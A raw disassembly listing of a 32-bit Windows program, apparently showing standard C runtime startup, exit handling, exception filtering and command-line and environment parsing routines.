  424307:	jg     0x4242bc
  424309:	or     BYTE PTR [ebp+0x3e],dh
  42430c:	(bad)  
  42430d:	jb     0x42434d
  42430f:	scas   al,BYTE PTR es:[edi]
  424310:	stos   DWORD PTR es:[edi],eax
  424311:	clc    
  424312:	call   0x209f:0x927a3c20
  424319:	mov    al,0x89
  42431b:	outs   dx,DWORD PTR ds:[esi]
  42431c:	jne    0x42437c
  42431e:	push   0x2
  424320:	push   0xa0
  424325:	push   0x0
  424327:	call   DWORD PTR ds:0x429030
  42432d:	push   0x0
  42432f:	push   0x0
  424331:	call   DWORD PTR ds:0x429138
  424337:	xor    eax,eax
  424339:	add    esp,0x10
  42433c:	ret    0x10
  42433f:	nop
  424340:	jmp    DWORD PTR ds:0x429124
  424346:	jmp    DWORD PTR ds:0x429128
  42434c:	jmp    DWORD PTR ds:0x42911c
  424352:	jmp    DWORD PTR ds:0x429118
  424358:	cmp    DWORD PTR ds:0x46707c,0x1
  42435f:	jne    0x424366
  424361:	call   0x4248a4
  424366:	push   DWORD PTR [esp+0x4]
  42436a:	call   0x42472d
  42436f:	push   0xff
  424374:	call   DWORD PTR ds:0x466774
  42437a:	pop    ecx
  42437b:	pop    ecx
  42437c:	ret    
  42437d:	cmp    DWORD PTR ds:0x46707c,0x1
  424384:	jne    0x42438b
  424386:	call   0x4248a4
  42438b:	push   DWORD PTR [esp+0x4]
  42438f:	call   0x42472d
  424394:	push   0xff
  424399:	call   0x424573
  42439e:	pop    ecx
  42439f:	pop    ecx
  4243a0:	ret    
  4243a1:	push   0x60
  4243a3:	push   0x429170
  4243a8:	call   0x425290
  4243ad:	mov    edi,0x94
  4243b2:	mov    eax,edi
  4243b4:	call   0x4252e0
  4243b9:	mov    DWORD PTR [ebp-0x18],esp
  4243bc:	mov    esi,esp
  4243be:	mov    DWORD PTR [esi],edi
  4243c0:	push   esi
  4243c1:	call   DWORD PTR ds:0x42906c
  4243c7:	mov    ecx,DWORD PTR [esi+0x10]
  4243ca:	mov    DWORD PTR ds:0x467084,ecx
  4243d0:	mov    eax,DWORD PTR [esi+0x4]
  4243d3:	mov    ds:0x467090,eax
  4243d8:	mov    edx,DWORD PTR [esi+0x8]
  4243db:	mov    DWORD PTR ds:0x467094,edx
  4243e1:	mov    esi,DWORD PTR [esi+0xc]
  4243e4:	and    esi,0x7fff
  4243ea:	mov    DWORD PTR ds:0x467088,esi
  4243f0:	cmp    ecx,0x2
  4243f3:	je     0x424401
  4243f5:	or     esi,0x8000
  4243fb:	mov    DWORD PTR ds:0x467088,esi
  424401:	shl    eax,0x8
  424404:	add    eax,edx
  424406:	mov    ds:0x46708c,eax
  42440b:	xor    esi,esi
  42440d:	push   esi
  42440e:	mov    edi,DWORD PTR ds:0x429044
  424414:	call   edi
  424416:	cmp    WORD PTR [eax],0x5a4d
  42441b:	jne    0x42443c
  42441d:	mov    ecx,DWORD PTR [eax+0x3c]
  424420:	add    ecx,eax
  424422:	cmp    DWORD PTR [ecx],0x4550
  424428:	jne    0x42443c
  42442a:	movzx  eax,WORD PTR [ecx+0x18]
  42442e:	cmp    eax,0x10b
  424433:	je     0x424454
  424435:	cmp    eax,0x20b
  42443a:	je     0x424441
  42443c:	mov    DWORD PTR [ebp-0x1c],esi
  42443f:	jmp    0x424468
  424441:	cmp    DWORD PTR [ecx+0x84],0xe
  424448:	jbe    0x42443c
  42444a:	xor    eax,eax
  42444c:	cmp    DWORD PTR [ecx+0xf8],esi
  424452:	jmp    0x424462
  424454:	cmp    DWORD PTR [ecx+0x74],0xe
  424458:	jbe    0x42443c
  42445a:	xor    eax,eax
  42445c:	cmp    DWORD PTR [ecx+0xe8],esi
  424462:	setne  al
  424465:	mov    DWORD PTR [ebp-0x1c],eax
  424468:	push   0x1
  42446a:	call   0x42523f
  42446f:	pop    ecx
  424470:	test   eax,eax
  424472:	jne    0x42447c
  424474:	push   0x1c
  424476:	call   0x42437d
  42447b:	pop    ecx
  42447c:	call   0x4251b6
  424481:	test   eax,eax
  424483:	jne    0x42448d
  424485:	push   0x10
  424487:	call   0x42437d
  42448c:	pop    ecx
  42448d:	call   0x42509f
  424492:	mov    DWORD PTR [ebp-0x4],esi
  424495:	call   0x424ea1
  42449a:	test   eax,eax
  42449c:	jge    0x4244a6
  42449e:	push   0x1b
  4244a0:	call   0x424358
  4244a5:	pop    ecx
  4244a6:	call   DWORD PTR ds:0x429068
  4244ac:	mov    ds:0x467834,eax
  4244b1:	call   0x424d7f
  4244b6:	mov    ds:0x467074,eax
  4244bb:	call   0x424cdd
  4244c0:	test   eax,eax
  4244c2:	jge    0x4244cc
  4244c4:	push   0x8
  4244c6:	call   0x424358
  4244cb:	pop    ecx
  4244cc:	call   0x424aaa
  4244d1:	test   eax,eax
  4244d3:	jge    0x4244dd
  4244d5:	push   0x9
  4244d7:	call   0x424358
  4244dc:	pop    ecx
  4244dd:	call   0x4245b5
  4244e2:	mov    DWORD PTR [ebp-0x20],eax
  4244e5:	cmp    eax,esi
  4244e7:	je     0x4244f0
  4244e9:	push   eax
  4244ea:	call   0x424358
  4244ef:	pop    ecx
  4244f0:	mov    DWORD PTR [ebp-0x38],esi
  4244f3:	lea    eax,[ebp-0x64]
  4244f6:	push   eax
  4244f7:	call   DWORD PTR ds:0x429064
  4244fd:	call   0x424a41
  424502:	mov    DWORD PTR [ebp-0x68],eax
  424505:	test   BYTE PTR [ebp-0x38],0x1
  424509:	je     0x424511
  42450b:	movzx  eax,WORD PTR [ebp-0x34]
  42450f:	jmp    0x424514
  424511:	push   0xa
  424513:	pop    eax
  424514:	push   eax
  424515:	push   DWORD PTR [ebp-0x68]
  424518:	push   esi
  424519:	push   esi
  42451a:	call   edi
  42451c:	push   eax
  42451d:	call   0x422e90
  424522:	mov    edi,eax
  424524:	mov    DWORD PTR [ebp-0x6c],edi
  424527:	cmp    DWORD PTR [ebp-0x1c],esi
  42452a:	jne    0x424532
  42452c:	push   edi
  42452d:	call   0x4246ed
  424532:	call   0x42470f
  424537:	jmp    0x424564
  424539:	mov    eax,DWORD PTR [ebp-0x14]
  42453c:	mov    ecx,DWORD PTR [eax]
  42453e:	mov    ecx,DWORD PTR [ecx]
  424540:	mov    DWORD PTR [ebp-0x70],ecx
  424543:	push   eax
  424544:	push   ecx
  424545:	call   0x4248dd
  42454a:	pop    ecx
  42454b:	pop    ecx
  42454c:	ret    
  42454d:	mov    esp,DWORD PTR [ebp-0x18]
  424550:	mov    edi,DWORD PTR [ebp-0x70]
  424553:	cmp    DWORD PTR [ebp-0x1c],0x0
  424557:	jne    0x42455f
  424559:	push   edi
  42455a:	call   0x4246fe
  42455f:	call   0x42471e
  424564:	or     DWORD PTR [ebp-0x4],0xffffffff
  424568:	mov    eax,edi
  42456a:	lea    esp,[ebp-0x7c]
  42456d:	call   0x4252cb
  424572:	ret    
  424573:	push   0x42918c
  424578:	call   DWORD PTR ds:0x429044
  42457e:	test   eax,eax
  424580:	je     0x424598
  424582:	push   0x42917c
  424587:	push   eax
  424588:	call   DWORD PTR ds:0x429048
  42458e:	test   eax,eax
  424590:	je     0x424598
  424592:	push   DWORD PTR [esp+0x4]
  424596:	call   eax
  424598:	push   DWORD PTR [esp+0x4]
  42459c:	call   DWORD PTR ds:0x429070
  4245a2:	int3   
  4245a3:	push   0x8
  4245a5:	call   0x42544f
  4245aa:	pop    ecx
  4245ab:	ret    
  4245ac:	push   0x8
  4245ae:	call   0x4253bb
  4245b3:	pop    ecx
  4245b4:	ret    
  4245b5:	mov    eax,ds:0x467830
  4245ba:	test   eax,eax
  4245bc:	je     0x4245c0
  4245be:	call   eax
  4245c0:	push   esi
  4245c1:	push   edi
  4245c2:	mov    ecx,0x42b00c
  4245c7:	mov    edi,0x42b018
  4245cc:	xor    eax,eax
  4245ce:	cmp    ecx,edi
  4245d0:	mov    esi,ecx
  4245d2:	jae    0x4245eb
  4245d4:	test   eax,eax
  4245d6:	jne    0x424617
  4245d8:	mov    ecx,DWORD PTR [esi]
  4245da:	test   ecx,ecx
  4245dc:	je     0x4245e0
  4245de:	call   ecx
  4245e0:	add    esi,0x4
  4245e3:	cmp    esi,edi
  4245e5:	jb     0x4245d4
  4245e7:	test   eax,eax
  4245e9:	jne    0x424617
  4245eb:	push   0x4250e3
  4245f0:	call   0x425560
  4245f5:	mov    esi,0x42b000
  4245fa:	mov    eax,esi
  4245fc:	mov    edi,0x42b008
  424601:	cmp    eax,edi
  424603:	pop    ecx
  424604:	jae    0x424615
  424606:	mov    eax,DWORD PTR [esi]
  424608:	test   eax,eax
  42460a:	je     0x42460e
  42460c:	call   eax
  42460e:	add    esi,0x4
  424611:	cmp    esi,edi
  424613:	jb     0x424606
  424615:	xor    eax,eax
  424617:	pop    edi
  424618:	pop    esi
  424619:	ret    
  42461a:	push   ebp
  42461b:	mov    ebp,esp
  42461d:	push   esi
  42461e:	push   edi
  42461f:	push   0x8
  424621:	call   0x42544f
  424626:	xor    esi,esi
  424628:	inc    esi
  424629:	cmp    DWORD PTR ds:0x4670c4,esi
  42462f:	pop    ecx
  424630:	jne    0x424642
  424632:	push   DWORD PTR [ebp+0x8]
  424635:	call   DWORD PTR ds:0x429078
  42463b:	push   eax
  42463c:	call   DWORD PTR ds:0x429074
  424642:	cmp    DWORD PTR [ebp+0xc],0x0
  424646:	mov    al,BYTE PTR [ebp+0x10]
  424649:	mov    DWORD PTR ds:0x4670c0,esi
  42464f:	mov    ds:0x4670bc,al
  424654:	jne    0x4246a8
  424656:	mov    ecx,DWORD PTR ds:0x467828
  42465c:	test   ecx,ecx
  42465e:	je     0x424689
  424660:	mov    eax,ds:0x467824
  424665:	sub    eax,0x4
  424668:	cmp    eax,ecx
  42466a:	jmp    0x424682
  42466c:	mov    eax,DWORD PTR [eax]
  42466e:	test   eax,eax
  424670:	je     0x424674
  424672:	call   eax
  424674:	mov    eax,ds:0x467824
  424679:	sub    eax,0x4
  42467c:	cmp    eax,DWORD PTR ds:0x467828
  424682:	mov    ds:0x467824,eax
  424687:	jae    0x42466c
  424689:	mov    eax,0x42b01c
  42468e:	mov    esi,0x42b020
  424693:	cmp    eax,esi
  424695:	mov    edi,eax
  424697:	jae    0x4246a8
  424699:	mov    eax,DWORD PTR [edi]
  42469b:	test   eax,eax
  42469d:	je     0x4246a1
  42469f:	call   eax
  4246a1:	add    edi,0x4
  4246a4:	cmp    edi,esi
  4246a6:	jb     0x424699
  4246a8:	mov    eax,0x42b024
  4246ad:	mov    esi,0x42b028
  4246b2:	cmp    eax,esi
  4246b4:	mov    edi,eax
  4246b6:	jae    0x4246c7
  4246b8:	mov    eax,DWORD PTR [edi]
  4246ba:	test   eax,eax
  4246bc:	je     0x4246c0
  4246be:	call   eax
  4246c0:	add    edi,0x4
  4246c3:	cmp    edi,esi
  4246c5:	jb     0x4246b8
  4246c7:	cmp    DWORD PTR [ebp+0x10],0x0
  4246cb:	pop    edi
  4246cc:	pop    esi
  4246cd:	je     0x4246d8
  4246cf:	push   0x8
  4246d1:	call   0x4253bb
  4246d6:	jmp    0x4246ea
  4246d8:	push   DWORD PTR [ebp+0x8]
  4246db:	mov    DWORD PTR ds:0x4670c4,0x1
  4246e5:	call   0x424573
  4246ea:	pop    ecx
  4246eb:	pop    ebp
  4246ec:	ret    
  4246ed:	push   0x0
  4246ef:	push   0x0
  4246f1:	push   DWORD PTR [esp+0xc]
  4246f5:	call   0x42461a
  4246fa:	add    esp,0xc
  4246fd:	ret    
  4246fe:	push   0x0
  424700:	push   0x1
  424702:	push   DWORD PTR [esp+0xc]
  424706:	call   0x42461a
  42470b:	add    esp,0xc
  42470e:	ret    
  42470f:	push   0x1
  424711:	push   0x0
  424713:	push   0x0
  424715:	call   0x42461a
  42471a:	add    esp,0xc
  42471d:	ret    
  42471e:	push   0x1
  424720:	push   0x1
  424722:	push   0x0
  424724:	call   0x42461a
  424729:	add    esp,0xc
  42472c:	ret    
  42472d:	push   ebp
  42472e:	mov    ebp,esp
  424730:	sub    esp,0x10c
  424736:	mov    eax,ds:0x4669f0
  42473b:	xor    eax,DWORD PTR [ebp+0x4]
  42473e:	mov    ecx,DWORD PTR [ebp+0x8]
  424741:	push   ebx
  424742:	push   esi
  424743:	mov    DWORD PTR [ebp-0x4],eax
  424746:	xor    edx,edx
  424748:	push   edi
  424749:	xor    eax,eax
  42474b:	cmp    ecx,DWORD PTR [eax*8+0x466780]
  424752:	je     0x42475a
  424754:	inc    eax
  424755:	cmp    eax,0x12
  424758:	jb     0x42474b
  42475a:	mov    esi,eax
  42475c:	shl    esi,0x3
  42475f:	cmp    ecx,DWORD PTR [esi+0x466780]
  424765:	jne    0x42488e
  42476b:	mov    eax,ds:0x46707c
  424770:	cmp    eax,0x1
  424773:	je     0x424869
  424779:	cmp    eax,edx
  42477b:	jne    0x42478a
  42477d:	cmp    DWORD PTR ds:0x466778,0x1
  424784:	je     0x424869
  42478a:	cmp    ecx,0xfc
  424790:	je     0x42488e
  424796:	push   0x104
  42479b:	lea    eax,[ebp-0x10c]
  4247a1:	push   eax
  4247a2:	push   edx
  4247a3:	mov    BYTE PTR [ebp-0x8],dl
  4247a6:	call   DWORD PTR ds:0x429084
  4247ac:	test   eax,eax
  4247ae:	jne    0x4247c3
  4247b0:	lea    eax,[ebp-0x10c]
  4247b6:	push   0x4294e4
  4247bb:	push   eax
  4247bc:	call   0x425670
  4247c1:	pop    ecx
  4247c2:	pop    ecx
  4247c3:	lea    eax,[ebp-0x10c]
  4247c9:	push   eax
  4247ca:	lea    edi,[ebp-0x10c]
  4247d0:	call   0x4258a0
  4247d5:	inc    eax
  4247d6:	cmp    eax,0x3c
  4247d9:	pop    ecx
  4247da:	jbe    0x424805
  4247dc:	lea    eax,[ebp-0x10c]
  4247e2:	push   eax
  4247e3:	call   0x4258a0
  4247e8:	mov    edi,eax
  4247ea:	lea    eax,[ebp-0x10c]
  4247f0:	sub    eax,0x3b
  4247f3:	push   0x3
  4247f5:	add    edi,eax
  4247f7:	push   0x4294e0
  4247fc:	push   edi
  4247fd:	call   0x425770
  424802:	add    esp,0x10
  424805:	push   edi
  424806:	call   0x4258a0
  42480b:	push   DWORD PTR [esi+0x466784]
  424811:	mov    ebx,eax
  424813:	call   0x4258a0
  424818:	lea    eax,[ebx+eax*1+0x1c]
  42481c:	pop    ecx
  42481d:	add    eax,0x3
  424820:	pop    ecx
  424821:	and    eax,0xfffffffc
  424824:	call   0x4252e0
  424829:	mov    ebx,esp
  42482b:	push   0x4294c4
  424830:	push   ebx
  424831:	call   0x425670
  424836:	push   edi
  424837:	push   ebx
  424838:	call   0x425680
  42483d:	push   0x4294c0
  424842:	push   ebx
  424843:	call   0x425680
  424848:	push   DWORD PTR [esi+0x466784]
  42484e:	push   ebx
  42484f:	call   0x425680
  424854:	push   0x12010
  424859:	push   0x429498
  42485e:	push   ebx
  42485f:	call   0x425572
  424864:	add    esp,0x2c
  424867:	jmp    0x42488e
  424869:	push   edx
  42486a:	lea    eax,[ebp+0x8]
  42486d:	push   eax
  42486e:	lea    esi,[esi+0x466784]
  424874:	push   DWORD PTR [esi]
  424876:	call   0x4258a0
  42487b:	pop    ecx
  42487c:	push   eax
  42487d:	push   DWORD PTR [esi]
  42487f:	push   0xfffffff4
  424881:	call   DWORD PTR ds:0x429080
  424887:	push   eax
  424888:	call   DWORD PTR ds:0x42907c
  42488e:	lea    esp,[ebp-0x118]
  424894:	mov    ecx,DWORD PTR [ebp-0x4]
  424897:	xor    ecx,DWORD PTR [ebp+0x4]
  42489a:	call   0x42595c
  42489f:	pop    edi
  4248a0:	pop    esi
  4248a1:	pop    ebx
  4248a2:	leave  
  4248a3:	ret    
  4248a4:	mov    eax,ds:0x46707c
  4248a9:	cmp    eax,0x1
  4248ac:	je     0x4248bb
  4248ae:	test   eax,eax
  4248b0:	jne    0x4248dc
  4248b2:	cmp    DWORD PTR ds:0x466778,0x1
  4248b9:	jne    0x4248dc
  4248bb:	push   0xfc
  4248c0:	call   0x42472d
  4248c5:	mov    eax,ds:0x4670c8
  4248ca:	test   eax,eax
  4248cc:	pop    ecx
  4248cd:	je     0x4248d1
  4248cf:	call   eax
  4248d1:	push   0xff
  4248d6:	call   0x42472d
  4248db:	pop    ecx
  4248dc:	ret    
  4248dd:	push   ebp
  4248de:	mov    ebp,esp
  4248e0:	push   ecx
  4248e1:	push   ebx
  4248e2:	push   esi
  4248e3:	push   edi
  4248e4:	call   0x425145
  4248e9:	mov    edi,DWORD PTR [ebp+0x8]
  4248ec:	mov    esi,eax
  4248ee:	mov    edx,DWORD PTR [esi+0x54]
  4248f1:	mov    eax,ds:0x466894
  4248f6:	mov    ecx,edx
  4248f8:	cmp    DWORD PTR [ecx],edi
  4248fa:	je     0x424909
  4248fc:	lea    ebx,[eax+eax*2]
  4248ff:	add    ecx,0xc
  424902:	lea    ebx,[edx+ebx*4]
  424905:	cmp    ecx,ebx
  424907:	jb     0x4248f8
  424909:	lea    eax,[eax+eax*2]
  42490c:	lea    eax,[edx+eax*4]
  42490f:	cmp    ecx,eax
  424911:	jae    0x424917
  424913:	cmp    DWORD PTR [ecx],edi
  424915:	je     0x424919
  424917:	xor    ecx,ecx
  424919:	test   ecx,ecx
  42491b:	je     0x424a33
  424921:	mov    ebx,DWORD PTR [ecx+0x8]
  424924:	test   ebx,ebx
  424926:	mov    DWORD PTR [ebp+0x8],ebx
  424929:	je     0x424a33
  42492f:	cmp    ebx,0x5
  424932:	jne    0x424940
  424934:	and    DWORD PTR [ecx+0x8],0x0
  424938:	xor    eax,eax
  42493a:	inc    eax
  42493b:	jmp    0x424a3c
  424940:	cmp    ebx,0x1
  424943:	je     0x424a2e
  424949:	mov    eax,DWORD PTR [esi+0x58]
  42494c:	mov    DWORD PTR [ebp-0x4],eax
  42494f:	mov    eax,DWORD PTR [ebp+0xc]
  424952:	mov    DWORD PTR [esi+0x58],eax
  424955:	mov    eax,DWORD PTR [ecx+0x4]
  424958:	cmp    eax,0x8
  42495b:	jne    0x424a20
  424961:	mov    edx,DWORD PTR ds:0x466888
  424967:	mov    eax,ds:0x46688c
  42496c:	add    eax,edx
  42496e:	cmp    edx,eax
  424970:	jge    0x424999
  424972:	lea    eax,[edx+edx*2]
  424975:	shl    eax,0x2
  424978:	mov    edi,DWORD PTR [esi+0x54]
  42497b:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424980:	mov    edi,DWORD PTR ds:0x466888
  424986:	mov    ebx,DWORD PTR ds:0x46688c
  42498c:	inc    edx
  42498d:	add    ebx,edi
  42498f:	add    eax,0xc
  424992:	cmp    edx,ebx
  424994:	jl     0x424978
  424996:	mov    ebx,DWORD PTR [ebp+0x8]
  424999:	mov    ecx,DWORD PTR [ecx]
  42499b:	cmp    ecx,0xc000008e
  4249a1:	mov    edi,DWORD PTR [esi+0x5c]
  4249a4:	jne    0x4249af
  4249a6:	mov    DWORD PTR [esi+0x5c],0x83
  4249ad:	jmp    0x424a13
  4249af:	cmp    ecx,0xc0000090
  4249b5:	jne    0x4249c0
  4249b7:	mov    DWORD PTR [esi+0x5c],0x81
  4249be:	jmp    0x424a13
  4249c0:	cmp    ecx,0xc0000091
  4249c6:	jne    0x4249d1
  4249c8:	mov    DWORD PTR [esi+0x5c],0x84
  4249cf:	jmp    0x424a13
  4249d1:	cmp    ecx,0xc0000093
  4249d7:	jne    0x4249e2
  4249d9:	mov    DWORD PTR [esi+0x5c],0x85
  4249e0:	jmp    0x424a13
  4249e2:	cmp    ecx,0xc000008d
  4249e8:	jne    0x4249f3
  4249ea:	mov    DWORD PTR [esi+0x5c],0x82
  4249f1:	jmp    0x424a13
  4249f3:	cmp    ecx,0xc000008f
  4249f9:	jne    0x424a04
  4249fb:	mov    DWORD PTR [esi+0x5c],0x86
  424a02:	jmp    0x424a13
  424a04:	cmp    ecx,0xc0000092
  424a0a:	jne    0x424a13
  424a0c:	mov    DWORD PTR [esi+0x5c],0x8a
  424a13:	push   DWORD PTR [esi+0x5c]
  424a16:	push   0x8
  424a18:	call   ebx
  424a1a:	pop    ecx
  424a1b:	mov    DWORD PTR [esi+0x5c],edi
  424a1e:	jmp    0x424a27
  424a20:	and    DWORD PTR [ecx+0x8],0x0
  424a24:	push   eax
  424a25:	call   ebx
  424a27:	mov    eax,DWORD PTR [ebp-0x4]
  424a2a:	pop    ecx
  424a2b:	mov    DWORD PTR [esi+0x58],eax
  424a2e:	or     eax,0xffffffff
  424a31:	jmp    0x424a3c
  424a33:	push   DWORD PTR [ebp+0xc]
  424a36:	call   DWORD PTR ds:0x429088
  424a3c:	pop    edi
  424a3d:	pop    esi
  424a3e:	pop    ebx
  424a3f:	leave  
  424a40:	ret    
  424a41:	cmp    DWORD PTR ds:0x46782c,0x0
  424a48:	jne    0x424a4f
  424a4a:	call   0x425e7c
  424a4f:	push   esi
  424a50:	mov    esi,DWORD PTR ds:0x467834
  424a56:	test   esi,esi
  424a58:	jne    0x424a61
  424a5a:	mov    esi,0x4294fb
  424a5f:	jmp    0x424aa6
  424a61:	mov    al,BYTE PTR [esi]
  424a63:	cmp    al,0x22
  424a65:	jne    0x424a8f
  424a67:	inc    esi
  424a68:	mov    al,BYTE PTR [esi]
  424a6a:	cmp    al,0x22
  424a6c:	je     0x424a9f
  424a6e:	test   al,al
  424a70:	je     0x424a88
  424a72:	movzx  eax,al
  424a75:	push   eax
  424a76:	call   0x42599b
  424a7b:	test   eax,eax
  424a7d:	pop    ecx
  424a7e:	je     0x424a81
  424a80:	inc    esi
  424a81:	inc    esi
  424a82:	mov    al,BYTE PTR [esi]
  424a84:	cmp    al,0x22
  424a86:	jne    0x424a6e
  424a88:	cmp    BYTE PTR [esi],0x22
  424a8b:	jne    0x424aa0
  424a8d:	jmp    0x424a9f
  424a8f:	cmp    al,0x20
  424a91:	jbe    0x424aa0
  424a93:	inc    esi
  424a94:	cmp    BYTE PTR [esi],0x20
  424a97:	ja     0x424a93
  424a99:	jmp    0x424aa0
  424a9b:	cmp    al,0x20
  424a9d:	ja     0x424aa6
  424a9f:	inc    esi
  424aa0:	mov    al,BYTE PTR [esi]
  424aa2:	test   al,al
  424aa4:	jne    0x424a9b
  424aa6:	mov    eax,esi
  424aa8:	pop    esi
  424aa9:	ret    
  424aaa:	push   ebx
  424aab:	xor    ebx,ebx
  424aad:	cmp    DWORD PTR ds:0x46782c,ebx
  424ab3:	push   esi
  424ab4:	push   edi
  424ab5:	jne    0x424abc
  424ab7:	call   0x425e7c
  424abc:	mov    esi,DWORD PTR ds:0x467074
  424ac2:	xor    edi,edi
  424ac4:	cmp    esi,ebx
  424ac6:	jne    0x424ada
  424ac8:	jmp    0x424afa
  424aca:	cmp    al,0x3d
  424acc:	je     0x424acf
  424ace:	inc    edi
  424acf:	push   esi
  424ad0:	call   0x4258a0
  424ad5:	pop    ecx
  424ad6:	lea    esi,[esi+eax*1+0x1]
  424ada:	mov    al,BYTE PTR [esi]
  424adc:	cmp    al,bl
  424ade:	jne    0x424aca
  424ae0:	lea    eax,[edi*4+0x4]
  424ae7:	push   eax
  424ae8:	call   0x425fb2
  424aed:	mov    edi,eax
  424aef:	cmp    edi,ebx
  424af1:	pop    ecx
  424af2:	mov    DWORD PTR ds:0x4670a4,edi
  424af8:	jne    0x424aff
  424afa:	or     eax,0xffffffff
  424afd:	jmp    0x424b57
  424aff:	mov    esi,DWORD PTR ds:0x467074
  424b05:	push   ebp
  424b06:	jmp    0x424b32
  424b08:	push   esi
  424b09:	call   0x4258a0
  424b0e:	mov    ebp,eax
  424b10:	inc    ebp
  424b11:	cmp    BYTE PTR [esi],0x3d
  424b14:	pop    ecx
  424b15:	je     0x424b30
  424b17:	push   ebp
  424b18:	call   0x425fb2
  424b1d:	cmp    eax,ebx
  424b1f:	pop    ecx
  424b20:	mov    DWORD PTR [edi],eax
  424b22:	je     0x424b5b
  424b24:	push   esi
  424b25:	push   eax
  424b26:	call   0x425670
  424b2b:	pop    ecx
  424b2c:	pop    ecx
  424b2d:	add    edi,0x4
  424b30:	add    esi,ebp
  424b32:	cmp    BYTE PTR [esi],bl
  424b34:	jne    0x424b08
  424b36:	push   DWORD PTR ds:0x467074
  424b3c:	call   0x425e9a
  424b41:	mov    DWORD PTR ds:0x467074,ebx
  424b47:	mov    DWORD PTR [edi],ebx
  424b49:	mov    DWORD PTR ds:0x467820,0x1
  424b53:	xor    eax,eax
  424b55:	pop    ecx
  424b56:	pop    ebp
  424b57:	pop    edi
  424b58:	pop    esi
  424b59:	pop    ebx
  424b5a:	ret    
  424b5b:	push   DWORD PTR ds:0x4670a4
  424b61:	call   0x425e9a
  424b66:	mov    DWORD PTR ds:0x4670a4,ebx
  424b6c:	or     eax,0xffffffff
  424b6f:	jmp    0x424b55
  424b71:	push   ebp
  424b72:	mov    ebp,esp
  424b74:	push   ecx
  424b75:	push   ebx
  424b76:	mov    ebx,DWORD PTR [ebp+0xc]
  424b79:	xor    edx,edx
  424b7b:	cmp    DWORD PTR [ebp+0x8],edx
  424b7e:	push   edi
  424b7f:	mov    DWORD PTR [esi],edx
  424b81:	mov    edi,ecx
  424b83:	mov    DWORD PTR [ebx],0x1
  424b89:	je     0x424b94
  424b8b:	mov    ecx,DWORD PTR [ebp+0x8]
  424b8e:	add    DWORD PTR [ebp+0x8],0x4
  424b92:	mov    DWORD PTR [ecx],edi
  424b94:	cmp    BYTE PTR [eax],0x22
  424b97:	jne    0x424ba7
  424b99:	xor    ecx,ecx
  424b9b:	test   edx,edx
  424b9d:	sete   cl
  424ba0:	inc    eax
  424ba1:	mov    edx,ecx
  424ba3:	mov    cl,0x22
  424ba5:	jmp    0x424bd4
  424ba7:	inc    DWORD PTR [esi]
  424ba9:	test   edi,edi
  424bab:	je     0x424bb2
  424bad:	mov    cl,BYTE PTR [eax]
  424baf:	mov    BYTE PTR [edi],cl
  424bb1:	inc    edi
  424bb2:	mov    cl,BYTE PTR [eax]
  424bb4:	movzx  ebx,cl
  424bb7:	inc    eax
  424bb8:	test   BYTE PTR [ebx+0x4674e1],0x4
  424bbf:	je     0x424bcd
  424bc1:	inc    DWORD PTR [esi]
  424bc3:	test   edi,edi
  424bc5:	je     0x424bcc
  424bc7:	mov    bl,BYTE PTR [eax]
  424bc9:	mov    BYTE PTR [edi],bl
  424bcb:	inc    edi
  424bcc:	inc    eax
  424bcd:	test   cl,cl
  424bcf:	mov    ebx,DWORD PTR [ebp+0xc]
  424bd2:	je     0x424c06
  424bd4:	test   edx,edx
  424bd6:	jne    0x424b94
  424bd8:	cmp    cl,0x20
  424bdb:	je     0x424be2
  424bdd:	cmp    cl,0x9
  424be0:	jne    0x424b94
  424be2:	test   edi,edi
  424be4:	je     0x424bea
  424be6:	and    BYTE PTR [edi-0x1],0x0
  424bea:	and    DWORD PTR [ebp-0x4],0x0
  424bee:	cmp    BYTE PTR [eax],0x0
  424bf1:	je     0x424ccd
  424bf7:	mov    cl,BYTE PTR [eax]
  424bf9:	cmp    cl,0x20
  424bfc:	je     0x424c03
  424bfe:	cmp    cl,0x9
  424c01:	jne    0x424c09
  424c03:	inc    eax
  424c04:	jmp    0x424bf7
  424c06:	dec    eax
  424c07:	jmp    0x424bea
  424c09:	cmp    BYTE PTR [eax],0x0
  424c0c:	je     0x424ccd
  424c12:	cmp    DWORD PTR [ebp+0x8],0x0
  424c16:	je     0x424c21
  424c18:	mov    ecx,DWORD PTR [ebp+0x8]
  424c1b:	add    DWORD PTR [ebp+0x8],0x4
  424c1f:	mov    DWORD PTR [ecx],edi
  424c21:	inc    DWORD PTR [ebx]
  424c23:	xor    ebx,ebx
  424c25:	inc    ebx
  424c26:	xor    edx,edx
  424c28:	jmp    0x424c2c
  424c2a:	inc    eax
  424c2b:	inc    edx
  424c2c:	cmp    BYTE PTR [eax],0x5c
  424c2f:	je     0x424c2a
  424c31:	cmp    BYTE PTR [eax],0x22
  424c34:	jne    0x424c5c
  424c36:	test   dl,0x1
  424c39:	jne    0x424c5a
  424c3b:	cmp    DWORD PTR [ebp-0x4],0x0
  424c3f:	je     0x424c4d
  424c41:	lea    ecx,[eax+0x1]
  424c44:	cmp    BYTE PTR [ecx],0x22
  424c47:	jne    0x424c4d
  424c49:	mov    eax,ecx
  424c4b:	jmp    0x424c4f
  424c4d:	xor    ebx,ebx
  424c4f:	xor    ecx,ecx
  424c51:	cmp    DWORD PTR [ebp-0x4],ecx
  424c54:	sete   cl
  424c57:	mov    DWORD PTR [ebp-0x4],ecx
  424c5a:	shr    edx,1
  424c5c:	test   edx,edx
  424c5e:	je     0x424c6d
  424c60:	test   edi,edi
  424c62:	je     0x424c68
  424c64:	mov    BYTE PTR [edi],0x5c
  424c67:	inc    edi
  424c68:	inc    DWORD PTR [esi]
  424c6a:	dec    edx
  424c6b:	jne    0x424c60
  424c6d:	mov    cl,BYTE PTR [eax]
  424c6f:	test   cl,cl
  424c71:	je     0x424cbb
  424c73:	cmp    DWORD PTR [ebp-0x4],0x0
  424c77:	jne    0x424c83
  424c79:	cmp    cl,0x20
  424c7c:	je     0x424cbb
  424c7e:	cmp    cl,0x9
  424c81:	je     0x424cbb
  424c83:	test   ebx,ebx
  424c85:	je     0x424cb5
  424c87:	test   edi,edi
  424c89:	je     0x424ca4
  424c8b:	movzx  edx,cl
  424c8e:	test   BYTE PTR [edx+0x4674e1],0x4
  424c95:	je     0x424c9d
  424c97:	mov    BYTE PTR [edi],cl
  424c99:	inc    edi
  424c9a:	inc    eax
  424c9b:	inc    DWORD PTR [esi]
  424c9d:	mov    cl,BYTE PTR [eax]
  424c9f:	mov    BYTE PTR [edi],cl
  424ca1:	inc    edi
  424ca2:	jmp    0x424cb3
  424ca4:	movzx  ecx,cl
  424ca7:	test   BYTE PTR [ecx+0x4674e1],0x4
  424cae:	je     0x424cb3
